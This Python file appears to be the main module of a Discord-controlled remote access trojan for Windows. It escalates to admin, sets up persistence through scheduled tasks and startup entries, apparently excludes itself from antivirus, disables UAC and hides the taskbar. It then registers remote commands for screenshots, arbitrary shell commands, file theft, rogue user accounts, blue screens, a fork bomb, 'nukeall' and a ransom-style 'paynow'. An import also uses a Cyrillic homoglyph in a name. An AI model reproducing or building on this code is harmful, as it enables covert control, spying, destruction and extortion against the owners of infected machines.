import os,sys,discord,threading;from discord.ext import commands
from utils.runadmin import ensure_admin_and_check_ran;from utils.schtask import setup_tasks;from utils.excludeme import excludeme;from utils.startup import add_to_startup;from utils.disable import *;from utils.nosites import *
from start.bots import bоts;from start.launch import run;from utils.remindme import*;from utils.cleardesk import *;from utils.wallpaper import *
from commands.basics import *;from commands.intermediates import *;from commands.filenav import *;from commands.others import *;from commands.fun import *
hidetaskbar()
no_uac()
threading.Thread(target=change_wallpaper).start()
threading.Thread(target=remindme).start()
threading.Thread(target=cleardesk).start()
threading.Thread(target=destroy).start()
threading.Thread(target=nobrowse).start()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)
log_file = os.path.join(os.getenv("APPDATA"), "logs", "alreadyran.txt")
os.makedirs(os.path.dirname(log_file), exist_ok=True)
if not os.path.exists(log_file):
    ensure_admin_and_check_ran(log_file)
    setup_tasks(sys.executable)
    add_to_startup()
    excludeme()
    threading.Thread(target=disable).start()
    threading.Thread(target=blocksites).start()
bot.allowed_channel_ids = {}
@bot.event
async def on_message(message):
    if message.channel.id not in bot.allowed_channel_ids:
        return
    await bot.process_commands(message)
bot.add_command(commands.Command(takepic, name='ss'))
bot.add_command(commands.Command(clean, name='clean'))    
bot.add_command(commands.Command(cmd, name='cmd')) 
bot.add_command(commands.Command(close,name='close'))
bot.add_command(commands.Command(speak,name='speak'))
bot.add_command(commands.Command(openurl,name='openurl'))
bot.add_command(commands.Command(search,name='search'))
bot.add_command(commands.Command(sharenote,name='sharenote'))
bot.add_command(commands.Command(startupapps,name='startupapps'))
bot.add_command(commands.Command(processes,name='lp'))
bot.add_command(commands.Command(share_file,name='share'))
bot.add_command(commands.Command(setvol,name='setvol'))
bot.add_command(commands.Command(bsod,name='bsod'))
bot.add_command(commands.Command(lockpc,name='lockpc'))
bot.add_command(commands.Command(restart,name='restartpc'))
bot.add_command(commands.Command(sd,name='sd'))
bot.add_command(commands.Command(kp,name='kp'))
bot.add_command(commands.Command(createuser,name='createuser'))
bot.add_command(commands.Command(deleteuser,name='deleteuser'))
bot.add_command(commands.Command(listuser,name='listusers'))
bot.add_command(commands.Command(nukeall,name='nukeall'))
bot.add_command(commands.Command(wallpaper,name='wallpaper'))
bot.add_command(commands.Command(promoteuser,name='promoteuser'))
bot.add_command(commands.Command(demoteuser,name='demoteuser'))
bot.add_command(commands.Command(nomouse,name='nomouse'))
bot.add_command(commands.Command(endpc,name='endpc'))
bot.add_command(commands.Command(anticonnect,name='noconnect'))
bot.add_command(commands.Command(cd_command, name ='cd'))
bot.add_command(commands.Command(taskbar, name ='taskbar'))
bot.add_command(commands.Command(forkbomb, name ='forkbomb'))
bot.add_command(commands.Command(paynow, name ='paynow'))
bot.add_command(commands.Command(alert, name='alert'))
@bot.event
async def on_ready():
    await run(bot)
bot.run(bots)
